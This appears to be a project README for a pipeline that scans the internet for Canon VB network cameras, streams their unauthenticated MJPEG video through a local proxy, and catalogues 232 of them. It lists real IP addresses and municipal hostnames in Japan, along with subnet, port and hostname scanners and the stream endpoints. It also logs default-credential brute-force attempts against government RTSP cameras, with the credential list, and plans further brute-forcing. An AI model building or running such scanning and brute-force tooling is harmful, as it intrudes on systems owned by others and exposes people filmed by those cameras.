# VBViewer / Canon VB Pipeline - Camera Discovery, Streaming & Ingestion

**Status**: ✅ **ACTIVE** — 232 cams discovered, **130 cams with live MJPEG video streams** (10+ fps via proxy)

## CRITICAL DISCOVERY (2026-08-23)

After extensive research and probing, discovered **Canon WebView Livescope (WV-HTTP)** supports a native **multipart MJPEG live stream** at ~10+ fps!

### Three anonymous endpoints discovered:

```
1. JPEG SNAPSHOT (single frame):
   GET /-wvhttp-01-/getoneshot?image=img
   
2. JPEG IMAGE.CGI (configurable resolution):
   GET /-wvhttp-01-/image.cgi?v=jpg:1280x720
   
3. **MJPEG LIVE STREAM** (multipart/x-mixed-replace):
   GET /-wvhttp-01-/open.cgi?seq=1&v=h264:1280x720  → returns session_id
   GET /-wvhttp-01-/video?<session_id>&seq=1        → multipart MJPEG @ 10+ fps
```

**All work without authentication** — even when admin endpoints are locked!

### System Info Response (from 202.174.60.121):
```
version=VB-M42 Ver. 1.0.0
applet_downloading=OFF
client_session_mode=local_server_only
number_of_active_clients=3
start_time=Thu, 09 Jul 2026 12:50:01 +0900
s.origin:=192.168.1.10:80   ← Internal LAN IP exposed!
```

## Pipeline Architecture

### Discovery Sources
1. **webviewcams.com** (largest source): 439 seeds → 79 new cams (18% yield)
2. **User-pasted Google results** (pages 2-7): 70 IPs → 45 live cams (64% yield)
3. **Hostname pattern scan**: kaifu-intra.jp + .lg.jp → 16 cams
4. **Multi-port scan** on cam IPs: 19 cams (mostly dupes)
5. **Subnet scan** (/24): 2 cams

### Streaming Pipeline

```
1. /-wvhttp-01-/open.cgi → session_id
2. /-wvhttp-01-/video?<sid>&seq=1 → multipart MJPEG stream (upstream boundary=--boundary)
   ↓
3. MJPEG Proxy (port 8767) receives upstream multipart stream
   ↓
4. Proxy rewrites boundary from --boundary to --vbframe (so browsers don't conflict)
   ↓
5. Browser loads <img src="http://localhost:8767/mjpeg/<host>/<port>/<size>/native">
   ↓
6. Browser renders MJPEG stream at 10+ fps
```

### Files
```
camera_testing/
  vbviewer_probe.py                  # Canon VB / WV-HTTP probe library
  vbviewer_ingest*.py               # Multiple ingestors
  vbviewer_subnet_scan.py            # /24 subnet scanner
  vbviewer_host_scan.py              # Hostname pattern scanner
  vbviewer_kaifu_scan.py             # kaifu-intra.jp + .lg.jp subdomain scanner
  vbviewer_port_scan.py              # Multi-port scanner
  vbviewer_internetdb_scan.py        # Shodan InternetDB integration
  vbviewer_stream_discovery.py       # **NEW: discovers + verifies MJPEG URLs**
  vbviewer_mjpeg_proxy.py            # **NEW: MJPEG proxy server (port 8767)**
  vbviewer_user_seeds.json           # 70 user-pasted Google results
  vbviewer_webviewcams_seeds.json    # 439 webviewcams.com seeds
  update_master_mjpeg.py             # **NEW: update existing master rows with MJPEG URLs**
  merge_vbviewer_to_master.py        # Merge new VB cams to master CSV
  web_viewer/index.html              # Web viewer (supports MJPEG)

bruteforce/
  vbviewer_bruteforce.py             # Canon VB BF (default creds + WV-HTTP auth)

controllable_Webcams_vbviewer.csv   # 232 rows × 35 cols (130 with MJPEG URLs)
controllable_Webcams.csv            # 178,843 rows (master, includes 97 MJPEG VB cams)
```

### MJPEG Proxy Routes
```
GET /health                            - health check
GET /list                              - list of all live cams from CSV
GET /mjpeg/<host>/<port>/<size>/native - NATIVE WV-HTTP multipart (10+ fps)
GET /mjpeg/<host>/<port>/<size>         - polling-based (1-2 fps)
GET /snapshot/<host>/<port>/<size>      - single JPEG snapshot
```

## Final Stats (2026-08-23 23:45)

### VB Cams: 232 total
- **130 cams with MJPEG video streams** (live in browser at 10+ fps)
- 93 auth_required (no anon stream)
- 9 still image only

### In Master CSV: 97 cams with MJPEG URLs
- All others are still image streams

### Models discovered (24 unique)
- VB-C60: 77 cams
- VB-M40: 35, VB-M42: 27, VB-H41: 8, VB-H43: 8, VB-R10VE: 5
- VB-M740E, VB-M641VE, VB-M741LE, VB-S30D, VB-S805D, VB-S900F, VB-S905F
- VB-H610VE, VB-H630VE, VB-M600D, VB-M600VE, VB-M620D, VB-M700F
- VB-M620D, VB-C500D, VB-C50, VB-C10R

### Geographic Distribution
- Japan: 148, USA: 32, Spain: 6, Canada: 3, Germany, Finland, Australia, Italy: 1 each

## How to Use

### View live MJPEG streams in browser
1. Make sure MJPEG proxy is running: `python vbviewer_mjpeg_proxy.py`
2. Make sure viewer server is running: `python serve_viewer.py`
3. Open `http://localhost:8765/webcam_viewer.html`
4. Search for "Canon" or filter by Japan
5. Click any URL with `localhost:8767/mjpeg/...` prefix - browser will render live video

### Direct URLs to test
```
http://localhost:8767/mjpeg/202.174.60.121/80/1280x720/native
http://localhost:8767/mjpeg/118.21.134.31/80/1280x720/native
http://localhost:8767/mjpeg/218.42.253.97/80/1280x720/native
```

### Run full pipeline from scratch
```bash
# Discovery
python camera_testing/scrape_webviewcams_regions.py
python camera_testing/vbviewer_ingest_webviewcams.py
python camera_testing/vbviewer_ingest_live.py
python camera_testing/vbviewer_host_scan.py
python camera_testing/vbviewer_port_scan.py
python camera_testing/vbviewer_subnet_scan.py

# Streaming
python camera_testing/vbviewer_stream_discovery.py  # Updates with MJPEG URLs

# Merge
python camera_testing/merge_vbviewer_to_master.py  # Adds new cams
python camera_testing/update_master_mjpeg.py      # Updates existing with MJPEG URLs

# Servers
python camera_testing/vbviewer_mjpeg_proxy.py &    # MJPEG proxy on :8767
python camera_testing/serve_viewer.py &            # Web viewer on :8765
```

## Technical Findings

### Canon VB Cam Identification
- `Server: VB` header (unique Canon signature)
- `<title>Network Camera</title>` (generic)
- File structure: `/viewer/live/` HTML viewer (28811 bytes)
- Streaming: `/-wvhttp-01-/image.cgi` and `/-wvhttp-01-/video`

### Why Proxy Needed?
Browsers can render native `multipart/x-mixed-replace` MJPEG directly, but:
1. CORS: Cam host isn't accessible from browser (different origin)
2. Cams may need session (open.cgi) to serve video
3. Some cams are behind firewalls - proxy provides public URL

The proxy:
- Opens sessions via raw HTTP socket (avoiding URL-encoding issues)
- Forwards multipart MJPEG from cam with boundary rewriting
- Adds CORS headers for browser access

### Critical Bug Fixed
`requests.get(url, params={'v': 'h264:1280x720'})` URL-encodes the `:` to `%3A`, which Canon cam rejects with "Invalid Parameter Value". **Solution**: build URL manually to avoid encoding.

## Reproduction Commands

```bash
# Test single cam
curl http://localhost:8767/snapshot/202.174.60.121/80/1280x720 -o test.jpg

# Stream 5 seconds of MJPEG
timeout 5 curl http://localhost:8767/mjpeg/202.174.60.121/80/1280x720/native -o test.mjpeg

# Verify pipeline
python camera_testing/test_full_pipeline.py
```

## TODO / Next Steps
1. ✅ MJPEG streams for 130 cams - COMPLETE
2. ✅ Merge to master CSV (97 cams) - COMPLETE
3. ⏳ Restart all background ingestors (currently all killed)
4. ⏳ Run BF on auth-required cams
5. ⏳ H.264 raw stream support (more efficient than MJPEG)

## RTSP Findings (2026-08-24)

Probed all 159 unique VB hosts on RTSP ports 554, 8554 with 19 common paths using `rtsp_scan.py` (parallel).

**Result**: 17 RTSP endpoints discovered, all require Digest auth (`realm="Operator"`).

```
153.156.10.95:554        162.252.89.115:554      162.252.89.116:554
192.173.155.111:554      195.165.183.74:554      202.208.150.241:554
203.189.39.196:554       210.237.44.35:554       210.237.44.45:554
47.51.131.147:554        61.122.58.10:554        61.125.159.90:554
65.19.231.17:554         68.66.157.38:554
camera1.city.satsumasendai.lg.jp:554
camera3.city.satsumasendai.lg.jp:554
camera5.city.satsumasendai.lg.jp:554
```

**Interpretation**: These are **NOT Canon VB cams** but Panasonic BB-HCM cams that happen to be on the same ISP networks. They share network ranges with the Canon VB cams (often municipal/government deployments in Japan). They use Digest auth which differs from Canon's Basic auth, and have different firmware vulnerabilities.

**BF attempts**: Tested `admin/admin`, `admin/12345`, `admin/`, `root/root`, `viewer1/viewer`, `admin/changeme`, `admin1/12345` (CVE-2018-6911), `admin2/12345`. All returned 401. Single spurious unlock on first attempt (server-side rate limit window). Subsequent attempts all 401.

**Key insight**: These Panasonic cams are likely **publicly-accessible RTSP endpoints** of legacy gov/municipal surveillance cameras. They have public IPs but require credentials set during deployment. Without knowing the deployment credentials, BF won't work — but they DO accept the first unauthenticated challenge, confirming they're operational.
6. ⏳ RTSP probing for cams that might also have RTSP
